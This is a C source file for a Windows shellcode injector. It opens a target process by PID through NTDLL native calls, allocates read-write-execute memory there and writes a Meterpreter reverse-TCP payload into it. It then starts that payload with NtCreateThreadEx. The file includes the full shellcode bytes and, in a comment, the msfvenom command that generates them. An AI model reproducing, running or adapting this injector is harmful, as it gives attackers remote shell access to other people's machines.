#include <stdio.h>
#include <stdlib.h>
#include "trex.h"
#define STATUS_SUCCESS ((NTSTATUS)0x0000000L)

#define okay(msg, ...) printf("[+] " msg "\n", ##__VA_ARGS__)
#define info(msg, ...) printf("[*] " msg "\n", ##__VA_ARGS__)
#define err(msg, ...) printf("[-] " msg "\n", ##__VA_ARGS__)

HMODULE GetMod(IN LPCWSTR modName) // wide char string - use L prefix in front of double quotes
    {
        HMODULE hModule = NULL;
        info("trying to get a handle to %s", modName);
        hModule = GetModuleHandleW(modName);

        if (hModule == NULL) {
            err("failed to get a handle to the module, error: 0x%lx\n", GetLastError());
            return NULL;
        }
        else {
            okay("got a handle to the module!");
            info("\\__[ %S\n\t\\0x%p]\n", modName, hModule);
            return hModule;
        }
    };

int main (int argc, char* argv[]) {

    if (argc < 2) {
        err("usage: %s <PID>", argv[0]);
        return EXIT_FAILURE;
    }

    unsigned long long PID = 0;
    PVOID rBuffer = NULL;
    HANDLE hProcess = NULL;
    HANDLE hThread = NULL;
    HANDLE hNTDLL = NULL;
    NTSTATUS STATUS = 0;

    /* msfvenom --platform windows --arch x64 -p windows/x64/meterpreter/reverse_tcp LHOST=<use listening machine> LPORT=4444 EXITFUNC=thread -f c --var-name=chemicals
*/

// shellcode for a 64-bit windows architecture reverse TCP meterpreter session

    unsigned char shellCode[] = 
"\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x4d\x31\xc9\x48\x0f"
"\xb7\x4a\x4a\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f"
"\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00\x48\x85\xc0"
"\x74\x67\x48\x01\xd0\x50\x44\x8b\x40\x20\x49\x01\xd0\x8b"
"\x48\x18\xe3\x56\x48\xff\xc9\x4d\x31\xc9\x41\x8b\x34\x88"
"\x48\x01\xd6\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1"
"\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8"
"\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"
"\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x41\x58\x41\x58"
"\x48\x01\xd0\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83"
"\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9"
"\x4b\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00"
"\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49"
"\x89\xe5\x49\xbc\x02\x00\x11\x5c\xac\x14\x0a\x03\x41\x54"
"\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5"
"\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b"
"\x00\xff\xd5\x6a\x0a\x41\x5e\x50\x50\x4d\x31\xc9\x4d\x31"
"\xc0\x48\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41"
"\xba\xea\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58"
"\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5"
"\x85\xc0\x74\x0a\x49\xff\xce\x75\xe5\xe8\x93\x00\x00\x00"
"\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9\x6a\x04\x41\x58"
"\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00"
"\x7e\x55\x48\x83\xc4\x20\x5e\x89\xf6\x6a\x40\x41\x59\x68"
"\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41\xba"
"\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31"
"\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9"
"\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x41\x57\x59\x68"
"\x00\x40\x00\x00\x41\x58\x6a\x00\x5a\x41\xba\x0b\x2f\x0f"
"\x30\xff\xd5\x57\x59\x41\xba\x75\x6e\x4d\x61\xff\xd5\x49"
"\xff\xce\xe9\x3c\xff\xff\xff\x48\x01\xc3\x48\x29\xc6\x48"
"\x85\xf6\x75\xb4\x41\xff\xe7\x58\x6a\x00\x59\xbb\xe0\x1d"
"\x2a\x0a\x41\x89\xda\xff\xd5";



    size_t payloadSize = sizeof(shellCode);
    size_t bytesWritten;

    PID = atoi(argv[1]);
    hNTDLL = GetMod(L"NTDLL");

    info("populating function prototypes...");
    NtOpenProcess open = (NtOpenProcess)GetProcAddress(hNTDLL, "NtOpenProcess");
    NtAllocateVirtualMemory allocate = (NtAllocateVirtualMemory)GetProcAddress(hNTDLL, "NtAllocateVirtualMemory");
    NtWriteVirtualMemory write = (NtWriteVirtualMemory)GetProcAddress(hNTDLL, "NtWriteVirtualMemory");
    NtCreateThreadEx thread = (NtCreateThreadEx)GetProcAddress(hNTDLL, "NtCreateThreadEx");
    NtWaitForSingleObject wait = (NtWaitForSingleObject)GetProcAddress(hNTDLL, "NtWaitForSingleObject");
    NtFreeVirtualMemory freeVM = (NtFreeVirtualMemory)GetProcAddress(hNTDLL, "NtFreeVirtualMemory");
    NtClose close = (NtClose)GetProcAddress(hNTDLL, "NtClose");
    okay("finished, beginning injection...");

    OBJECT_ATTRIBUTES objatt; // for standard processes, all fields are set to NULL
    objatt.Length = sizeof(OBJECT_ATTRIBUTES); // this is the only required field
    objatt.RootDirectory = NULL;
    objatt.ObjectName = NULL;
    objatt.Attributes = 0;
    objatt.SecurityDescriptor = NULL;
    objatt.SecurityQualityOfService = NULL;

    CLIENT_ID CID;
    CID.UniqueProcess = (HANDLE)PID;
    CID.UniqueThread = NULL;


    STATUS = open(&hProcess, PROCESS_ALL_ACCESS, &objatt, &CID);
    if (STATUS != STATUS_SUCCESS) {
        err("[NtOpenProcess] failed, error: 0x%x", STATUS);
        goto CLEANUP;
    }
    okay("got a handle on the process!");
    info("\\__[ hProcess\n\t\\0x%p]\n", hProcess);

    STATUS = allocate(hProcess, &rBuffer, 0, &payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (STATUS != STATUS_SUCCESS) {
        err("[NtAllocateVirtualMemory] failed, error: 0x%x", STATUS);
        goto CLEANUP;
    }
    okay("[0x%p] allocated %zu-bytes with PAGE_EXECUTE_READWRITE permissions", rBuffer, payloadSize);

    info("writing shellcode to buffer...");
    for (int i = 0; i < sizeof(shellCode); i++) {
        if (i % 16 == 0) {
            printf("\n ");
        }
        printf(" %02X", shellCode[i]);
    }
    puts("\n");

    STATUS = write(hProcess, rBuffer, (PVOID)shellCode, sizeof(shellCode), &bytesWritten);
    if (STATUS != STATUS_SUCCESS) {
        err("[NtWriteVirtualMemory] failed, error: 0x%x", STATUS);
        goto CLEANUP;
    }
    okay("wrote %zu-bytes to process memory", bytesWritten);

    STATUS = thread(&hThread, THREAD_ALL_ACCESS, &objatt, hProcess, (PUSER_THREAD_START_ROUTINE)rBuffer, NULL, 0, 0, 0, 0, NULL);
    if (STATUS != STATUS_SUCCESS) {
        err("[NtCreateThreadEx] failed, error: 0x%x", STATUS);
        goto CLEANUP;
    }
    okay("thread created, routine started, waiting to finish execution...");

    STATUS = wait(hThread, FALSE, NULL);
    okay("thread finished execution, beginning cleanup...\n");
    if (rBuffer) {
        info("freeing allocated memory");
        freeVM(hProcess, &rBuffer, NULL, MEM_DECOMMIT | MEM_RELEASE);
        okay("memory deallocated\n");
    }
    if (hThread) {
        info("closing handle to the thread");
        NtClose(hThread);
        okay("thread closed\n");
    }
    if (hProcess) {
        info("closing handle to the process");
        NtClose(hProcess);
        okay("process closed\n");
    }
    okay("finished with cleanup, exiting now.");
    return EXIT_SUCCESS;

CLEANUP:
    if (rBuffer) {
        info("freeing allocated memory");
        freeVM(hProcess, &rBuffer, NULL, MEM_DECOMMIT | MEM_RELEASE);
        okay("memory deallocated\n");
    }
    if (hThread) {
        info("closing handle to the thread");
        NtClose(hThread);
        okay("thread closed\n");
    }
    if (hProcess) {
        info("closing handle to the process");
        NtClose(hProcess);
        okay("process closed\n");
    }
    okay("finished with cleanup, exiting now.");
    return EXIT_FAILURE;
}
